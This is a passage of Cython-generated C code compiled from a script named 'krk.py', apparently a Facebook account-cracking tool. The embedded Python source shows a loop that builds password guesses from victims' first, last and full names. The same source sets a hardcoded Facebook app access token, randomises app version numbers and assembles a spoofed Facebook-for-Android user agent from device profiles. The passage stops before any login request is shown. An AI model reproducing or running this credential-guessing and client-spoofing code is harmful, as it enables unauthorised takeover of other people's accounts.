          __Pyx_GOTREF(__pyx_t_16);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_16, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        __pyx_t_16 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_16, __pyx_n_s_First, __pyx_v_fn};
          __pyx_t_15 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_15, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
        __pyx_t_16 = __Pyx_PyObject_GetAttrStr(__pyx_v_ln, __pyx_n_s_lower); if (unlikely(!__pyx_t_16)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_16);
        __pyx_t_18 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_16))) {
          __pyx_t_18 = PyMethod_GET_SELF(__pyx_t_16);
          if (likely(__pyx_t_18)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_16);
            __Pyx_INCREF(__pyx_t_18);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_16, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_18, };
          __pyx_t_15 = __Pyx_PyObject_FastCall(__pyx_t_16, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
          if (unlikely(!__pyx_t_15)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_15);
          __Pyx_DECREF(__pyx_t_16); __pyx_t_16 = 0;
        }
        __pyx_t_16 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_16 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_16)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_16);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_16, __pyx_n_s_last, __pyx_t_15};
          __pyx_t_6 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_16); __pyx_t_16 = 0;
          __Pyx_DECREF(__pyx_t_15); __pyx_t_15 = 0;
          if (unlikely(!__pyx_t_6)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_6);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_6, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
        __pyx_t_6 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_6, __pyx_n_s_Last, __pyx_v_ln};
          __pyx_t_9 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_9);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        __pyx_t_9 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_9, __pyx_n_s_Name, __pyx_v_names};
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_replace); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_v_names, __pyx_n_s_lower); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 392, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_9);
        __pyx_t_6 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_9))) {
          __pyx_t_6 = PyMethod_GET_SELF(__pyx_t_9);
          if (likely(__pyx_t_6)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_9);
            __Pyx_INCREF(__pyx_t_6);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_9, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[1] = {__pyx_t_6, };
          __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+1-__pyx_t_10, 0+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_6); __pyx_t_6 = 0;
          if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_4);
          __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;
        }
        __pyx_t_9 = NULL;
        __pyx_t_10 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_17))) {
          __pyx_t_9 = PyMethod_GET_SELF(__pyx_t_17);
          if (likely(__pyx_t_9)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_17);
            __Pyx_INCREF(__pyx_t_9);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_17, function);
            __pyx_t_10 = 1;
          }
        }
        {
          PyObject *__pyx_callargs[3] = {__pyx_t_9, __pyx_n_s_name, __pyx_t_4};
          __pyx_t_5 = __Pyx_PyObject_FastCall(__pyx_t_17, __pyx_callargs+1-__pyx_t_10, 2+__pyx_t_10);
          __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;
          __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
          if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 392, __pyx_L3_error)
          __Pyx_GOTREF(__pyx_t_5);
          __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        }
        __Pyx_XDECREF_SET(__pyx_v_pas, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":393
 *                 for pw in passlist:
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'             # <<<<<<<<<<<<<<
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 */
        __Pyx_INCREF(__pyx_kp_s_350685531728_62f8ce9f74b12f84c12);
        __Pyx_XDECREF_SET(__pyx_v_accessToken, __pyx_kp_s_350685531728_62f8ce9f74b12f84c12);

        /* "krk.py":394
 *                         pas = pw.replace('first',fn.lower()).replace('First',fn).replace('last',ln.lower()).replace('Last',ln).replace('Name',names).replace('name',names.lower())
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'             # <<<<<<<<<<<<<<
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 */
        __pyx_t_5 = PyTuple_New(5); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_21 = 0;
        __pyx_t_22 = 127;
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __Pyx_INCREF(__pyx_kp_u_0_0);
        __pyx_t_21 += 5;
        __Pyx_GIVEREF(__pyx_kp_u_0_0);
        PyTuple_SET_ITEM(__pyx_t_5, 1, __pyx_kp_u_0_0);
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_17 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_17, __pyx_tuple__71, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_FormatSimple(__pyx_t_4, __pyx_empty_unicode); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_17) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_17);
        __Pyx_GIVEREF(__pyx_t_17);
        PyTuple_SET_ITEM(__pyx_t_5, 2, __pyx_t_17);
        __pyx_t_17 = 0;
        __Pyx_INCREF(__pyx_kp_u__72);
        __pyx_t_21 += 1;
        __Pyx_GIVEREF(__pyx_kp_u__72);
        PyTuple_SET_ITEM(__pyx_t_5, 3, __pyx_kp_u__72);
        __Pyx_GetModuleGlobalName(__pyx_t_17, __pyx_n_s_random); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_17, __pyx_n_s_randint); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_17 = __Pyx_PyObject_Call(__pyx_t_4, __pyx_tuple__70, NULL); if (unlikely(!__pyx_t_17)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_17);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_FormatSimple(__pyx_t_17, __pyx_empty_unicode); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_17); __pyx_t_17 = 0;
        __pyx_t_22 = (__Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) > __pyx_t_22) ? __Pyx_PyUnicode_MAX_CHAR_VALUE(__pyx_t_4) : __pyx_t_22;
        __pyx_t_21 += __Pyx_PyUnicode_GET_LENGTH(__pyx_t_4);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 4, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyUnicode_Join(__pyx_t_5, 5, __pyx_t_21, __pyx_t_22); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 394, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbav, ((PyObject*)__pyx_t_4));
        __pyx_t_4 = 0;

        /* "krk.py":395
 *                         accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))             # <<<<<<<<<<<<<<
 *                         android_version = device['android_version']
 *                         model = device['model']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_random); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 395, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_n_s_randint); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 395, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_tuple__73, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 395, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = __Pyx_PyObject_Str(__pyx_t_4); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 395, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":396
 *                         fbav = f'{random.randint(111,999)}.0.0.{random.randint(11,99)}.{random.randint(111,999)}'
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']             # <<<<<<<<<<<<<<
 *                         model = device['model']
 *                         build = device['build']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 396, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_android_version); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 396, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_android_version, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":397
 *                         fbbv = str(random.randint(111111111,999999999))
 *                         android_version = device['android_version']
 *                         model = device['model']             # <<<<<<<<<<<<<<
 *                         build = device['build']
 *                         fblc = device['fblc']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 397, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_model); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 397, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_model, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":398
 *                         android_version = device['android_version']
 *                         model = device['model']
 *                         build = device['build']             # <<<<<<<<<<<<<<
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 398, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_build); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 398, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_build, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":399
 *                         model = device['model']
 *                         build = device['build']
 *                         fblc = device['fblc']             # <<<<<<<<<<<<<<
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 399, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fblc); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 399, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fblc, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":400
 *                         build = device['build']
 *                         fblc = device['fblc']
 *                         fbcr = sim_id             # <<<<<<<<<<<<<<
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_sim_id); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 400, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_XDECREF_SET(__pyx_v_fbcr, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":401
 *                         fblc = device['fblc']
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']             # <<<<<<<<<<<<<<
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 401, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbmf); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 401, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbmf, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":402
 *                         fbcr = sim_id
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']             # <<<<<<<<<<<<<<
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 402, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbbd); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 402, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbbd, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":403
 *                         fbmf = device['fbmf']
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']             # <<<<<<<<<<<<<<
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 403, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbdv); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 403, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdv, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":404
 *                         fbbd = device['fbbd']
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']             # <<<<<<<<<<<<<<
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 404, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbsv); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 404, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbsv, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":405
 *                         fbdv = device['fbdv']
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']             # <<<<<<<<<<<<<<
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_5, __pyx_n_s_device); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 405, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __pyx_t_4 = __Pyx_PyObject_Dict_GetItem(__pyx_t_5, __pyx_n_s_fbca); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 405, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbca, __pyx_t_4);
        __pyx_t_4 = 0;

        /* "krk.py":406
 *                         fbsv = device['fbsv']
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']             # <<<<<<<<<<<<<<
 *                         fbfw = '1'
 *                         fbrv = '0'
 */
        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_device); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 406, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_4);
        __pyx_t_5 = __Pyx_PyObject_Dict_GetItem(__pyx_t_4, __pyx_n_s_fbdm); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 406, __pyx_L3_error)
        __Pyx_GOTREF(__pyx_t_5);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_XDECREF_SET(__pyx_v_fbdm, __pyx_t_5);
        __pyx_t_5 = 0;

        /* "krk.py":407
 *                         fbca = device['fbca']
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'             # <<<<<<<<<<<<<<
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 */
        __Pyx_INCREF(__pyx_kp_s_1);
        __Pyx_XDECREF_SET(__pyx_v_fbfw, __pyx_kp_s_1);

        /* "krk.py":408
 *                         fbdm = device['fbdm']
 *                         fbfw = '1'
 *                         fbrv = '0'             # <<<<<<<<<<<<<<
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 */
        __Pyx_INCREF(__pyx_kp_s_0);
        __Pyx_XDECREF_SET(__pyx_v_fbrv, __pyx_kp_s_0);

        /* "krk.py":409
 *                         fbfw = '1'
 *                         fbrv = '0'
 *                         fban = 'FB4A'             # <<<<<<<<<<<<<<
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 */
        __Pyx_INCREF(__pyx_n_s_FB4A);
        __Pyx_XDECREF_SET(__pyx_v_fban, __pyx_n_s_FB4A);

        /* "krk.py":410
 *                         fbrv = '0'
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'             # <<<<<<<<<<<<<<
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'
 *                         random_seed = random.Random()
 */
        __Pyx_INCREF(__pyx_kp_s_com_facebook_katana);
        __Pyx_XDECREF_SET(__pyx_v_fbpn, __pyx_kp_s_com_facebook_katana);

        /* "krk.py":411
 *                         fban = 'FB4A'
 *                         fbpn = 'com.facebook.katana'
 *                         ua = 'Davik/2.1.0 (Linux; U; Android '+android_version+'.0.1; '+model+' Build/'+build+') [FBAN/'+fban+';FBAV/'+fbav+';FBBV/'+fbbv+';FBDM/{density=2.625,width=1080,height=1920};FBLC/'+fblc+';FBRV/'+str(random.randint(000000000,999999999))+';FBCR/'+fbcr+';FBMF/'+fbmf+';FBBD/'+fbbd+';FBPN/'+fbpn+';FBDV/'+fbdv+';FBSV/'+fbsv+';FBOP/19;FBCA/'+fbca+';]'             # <<<<<<<<<<<<<<
 *                         random_seed = random.Random()
 *                         adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
 */
